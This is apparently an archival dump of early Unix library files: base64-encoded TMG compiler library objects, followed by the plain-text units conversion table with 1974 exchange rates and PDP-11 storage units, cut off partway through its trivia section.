AAMAeANlawAAAAAAACAAAABlcAAAAAAAACAAAABlay5mcwAAACAAAABlcC5mcwAAACAAAA
BmcwAAAAAAACAAAABrdGF0AAAAACAAAAAudHAAAAAAACIAoAJnY29udGluAAIAJAJiYWRh
ZHIAAAIAVgJnZgAAAAAAAAIAdgJnYwAAAAAAAAIAeAJnawAAAAAAAAIAlAJsZmlsZQAAAC
AAAABvdXRiAAAAACAAAABvdXR0AAAAACAAAABvdXR3AAAAACAAAAA=
-- /usr/lib/tmgb mode=0110664 uid=3 gid=3 atime=174924575 mtime=169259121 base64=1 --
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
AAAAAwH2ZQAAAACBHQIAgB0AAPcJxv/3CcL/wAsVAzYQAADAZQAA9wmy//cJrv+BHQIA9w
mm/yYQ9wmg/xYg3gbhBcALKgPzAfYLBgAFA9MLxmUIAHcAhP+BHQIA9wl8/zYQBAAACvcJ
cv/3CW7/9wlq/4AdAAD3CWL/gB0EADYQAAD3CVb/9wlS//cJTv+BHQIA9wlG/8AL+AL3CT
7/iB0AAMZlCAB3ADL/AAAAAAAAAAAJAQAA+QAAAAAAAABZAAAAAABpAAAAAAAAACgAAAAA
AAAAGAAAAAAAAAAAAAAAAACZAAAAqQAAAAAAAAAAAAAAOAAAAJkAAAAJAQAAAAAAALkAAA
AAAPkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABZAAAAAAAAABkBAAAAAAAAAADJAAAA
yQAAAMkAAAAAAAAAmQAAAAAAAAAAAAAA6QAAAAkBAAD5AAAAAAAAANkAAAAAAAAAaQAAAA
AAAAAAAAAASQBpAAAAAAAAABQAAwBscHRyAAAAACAAAABycHRyAAAAACAAAABzcHRyAAAA
ACAAAABzdWNjAAAAACAAAABmYWlsAAAAACAAAABpZ2V0AAAAACAAAABmaW5kAAAAACIAAA
BlbnRlcgAAACIABABzZWVrY2hhciAAAABnZXR3b3JkACAAAABnZXRjaGFyACAAAABwdXR3
b3JkACAAAABwdXRjaGFyACAAAABhbHRlcndvciAAAABnZXRjc3RyACAAAAByZXdjc3RyAC
AAAABsZW5ndGgAACAAAAByZXdpbmQAACAAAABpbmRleAAAAAEAAAB0YWJsZXAAAAEAAgB0
ZW1wAAAAAAEABAB3aGljaAAAAAEABgBmcmFtZWwAAAEACAByaWdodAAAAAIAIABsZWZ0AA
AAAAIAKABub21vcmUAAAIAbABmb3VuZAAAAAIAvgBnZXRuYW0ubxEKPZcAtrABBwFqAAAA
AADMAAAAAAAAAMAVIQD3Cfj/9wn0/wAS9wnu//cJ6v8AEvcJ5P93AOD/9y3c/9r/BQP3Cd
T/9x3Q/87/wRRmEMAUwGUAAPcJwP+BE8Iduv/3Cbb/wAsLAzKQAACCCrcQqP+XIAAA9AX3
CZ7/7gHWC3cAlv8AAAIAAAAZAAAAyQAAAAAAKQAAAMkAAAAAACkAAAD5AAAAmQCpAAAAAA
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
AkAHJlYWRjAAAAAwBeAGlucGIAAAAABABgAA==
-- /usr/lib/tmgc mode=0100664 uid=3 gid=3 atime=174924575 mtime=174924481 base64=1 --
BwEAAAwAEAhcAQAAAAAAAP//AQABAAIAAQAAAAAAAAAAAAAAAAAAAHRhYmxlcwAAIwAAAH
gAAAAAAAAAIQACAHNpAAAAAAAAIQAEAGoAAAAAAAAAIQAGAGsAAAAAAAAAIQAIAG4AAAAA
AAAAIQAKAGcxAAAAAAAAIQAOAGVudgAAAAAAIQAMAGVrAAAAAAAAIQAAAGVrLmZzAAAAIQ
AIAGVwAAAAAAAAIQAGAGVwLmZzAAAAIQAOAGZzAAAAAAAAIQAIAGxwdHIAAAAAIQACAHNw
dHIAAAAAIQAGAHJwdHIAAAAAIQAEAG91dGIAAAAAJAAMAG91dHQAAAAAIQBAAG91dHcAAA
AAIwAKAHN0a3QAAAAAIQAgA3N0a2IAAAAAJAD8BHN0a2UAAAAAJAAcCGt0YXQAAAAAIQCw
BGt0YWIAAAAAJABMAGlucHV0AAAAIwAAAGNmaWxlAAAAIwACAGxmaWxlAAAAIwAEAGRmaW
xlAAAAIwAGAG9maWxlAAAAIwAIAA==
-- /usr/lib/units mode=0110664 uid=3 gid=3 atime=174927044 mtime=169848621 --
/ dimensions
m			*a*
kg			*b*
sec			*c*
coul			*d*
candela			*e*
dollar			*f*
radian			*g*
bit			*h*
deg			*i*

/ constants

fuzz			1
pi			3.14159265358979323846
c			2.997925+8 m/sec fuzz
g			9.80665 m/sec2
au			1.4959789+11 m fuzz
mole			6.022169+23 fuzz
e			1.6021917-19 coul fuzz
energy			c2
force			g
mercury			1.33322+5 kg/m2-sec2
hg			mercury

/ dimensionless

degree			1|180 pi-radian
circle			2 pi-radian
turn			2 pi-radian
grade			.9 degree
arcdeg			1 degree
arcmin			1|60 arcdeg
arcsec			1|60 arcmin

steradian		radian2
sphere			4 pi-steradian
sr			steradian

/ Time

second			sec
s			sec
minute			60 sec
min			minute
hour			60 min
hr			hour
day			24 hr
da			day
week			7 day
year			365.24219879 day fuzz
yr			year
month			1|12 year
ms			millisec
us			microsec

/ Mass

gram			millikg
gm			gram
mg			milligram
metricton		kilokg

/ Avoirdupois

lb			.45359237 kg
lbf			lb g
ounce			1|16 lb
oz			ounce
dram			1|16 oz
dr			dram
grain			1|7000 lb
gr			grain
shortton		2000 lb
ton			shortton
longton			2240 lb

/ Apothecary

scruple			20 grain
apdram			60 grain
apounce			480 grain
appound			5760 grain

/ Length

meter			m
cm			centimeter
mm			millimeter
km			kilometer
nm			nanometer
micron			micrometer
angstrom		decinanometer

inch			2.54 cm
in			inch
foot			12 in
feet			foot
ft			foot
yard			3 ft
yd			yard
rod			5.5 yd
rd			rod
mile			5280 ft
mi			mile

british			1200|3937 m/ft
nmile			1852m

acre			4840 yd2

cc			cm3
liter			kilocc
ml			milliliter

/ US Liquid

gallon			231 in3
gal			gallon
quart			1|4 gal
qt			quart
pint			1|2 qt
pt			pint

floz			1|16 pt
fldr			1|8 floz

/ US Dry

dry			268.8025 in3/gallon fuzz
peck			8 dry-quart
pk			peck
bushel			4 peck
bu			bushel

/ British

brgallon		277.420 in3 fuzz
brquart			1|4 brgallon
brpint			1|2 brquart
brfloz			1|20 brpint
brpeck			554.84 in3 fuzz
brbushel		4 brpeck

/ Energy Work

newton			kg-m/sec2
nt			newton
joule			nt-m
cal			4.1868 joule

/ Electrical

coulomb			coul
ampere			coul/sec
amp			ampere
watt			joule/sec
volt			watt/amp
ohm			volt/amp
mho			/ohm
farad			coul/volt
henry			sec2/farad
weber			volt-sec

/ Light

cd			candela
lumen			cd sr
lux			cd sr/m2

/ Money
/ epoch fri sept 6, 1974 wall st j

$			dollar
argentinapeso		.102 $
australiadollar		1.4925 $
austriaschilling	.053 $
belgiumfranc		.0253 $
brazilcruzeiro		.149 $
britainpound		2.3101 $
canadadollar		1.012 $
colombiapeso		.0397 $
denmarkkrone		.1603 $
equadorsucre		.0401 $
finlandmarkka		.2630 $
francefranc		.2071 $
greecedrachma		.0338 $
hongkongdollar		.198 $
indiarupee		.125 $
iranrial		.0148 $
iraqdinar		3.4 $
israelpound		.2385 $
italylira		.001508 $
japanyen		.003303 $
lebanonpound		.45 $
mexicopeso		.08006 $
netherlandsguilder	.3675 $
newzealanddollar	1.43 $
norwaykrone		.1795 $
pakistanrupee		.102 $
perusol			.0234 $
phillippinespeso	.149 $
portugalescudo		.0387 $
singaporedollar		.4035 $
southafricarand		1.425 $
spainpeseta		.0174 $
swedenkrona		.2225 $
switzerlandfranc	.3314 $
taiwandollar		.0264 $
uruguaypeso		.00081 $
venezuelabolivar	.233 $
germanymark		.3744 $

mark			germanymark
bolivar			venezuelabolivar
peseta			spainpeseta
rand			southafricarand
escudo			portugalescudo
sol			perusol
guilder			netherlandsguilder
peso			mexicopeso
yen			japanyen
lira			italylira
dinar			iraqdinar
rial			iranrial
rupee			indiarupee
drachma			greecedrachma
franc			francefranc
markka			finlandmarkka
sucre			equadorsucre
pound			britainpound
cruzeiro		brazilcruzeiro

/ PDP-11

baud			bit/sec
byte			8 bit
word			2 byte
block			512 byte
K			1024 word
tc			578 block
rktrack			12 block
rkcylinder		2 rktrack
rk			203 rkcylinder
rptrack			10 block
rpcylinder		20 rptracks
rp			406 rpcylinder
rftrack			8 block
rfshoe			8 rftrack
rfdisk			16 rfshoe
rf			2 rfdisk

/ Trivia

%			1|100
admiraltyknot		6080 ft/hr
apostilb		cd/pi-m2
are			1+2 m2
arpentcan		27.52 mi
arpentlin		191.835 ft
astronomicalunit	au
atmosphere		1.01325+5 nt/m2
atm			atmosphere
atomicmassunit		1.66044-27 kg fuzz
amu			atomicmassunit
bag			94 lb
bakersdozen		13
bar			1+5 nt/m2
barie			1-1 nt/m2
barleycorn		1|3 in
barn			1-28 m2
barrel			42 gal
barye			1-1 nt/m2
bev			1+9 e-volt
biot			10 amp
blondel			cd/pi-m2
boardfoot		144 in3
bolt			40 yd
bottommeasure		1|40 in
britishthermalunit	1.05506+3 joule fuzz
btu			britishthermalunit
buck			dollar
cable			720 ft
caliber			1-2 in
calorie			cal
carat			205 mg
cent			centidollar
cental			100 lb
centesimalminute	1-2 grade
centesimalsecond	1-4 grade
century			100 year
cfs			ft3/sec
chain			66 ft
circularinch		1|4 pi-in2
circularmil		1-6|4 pi-in2
clusec			1-8 mm-hg m3/s
coomb			4 bu
cord			128 ft3
cordfoot		cord
crith			9.06-2 gm
cubit			18 in
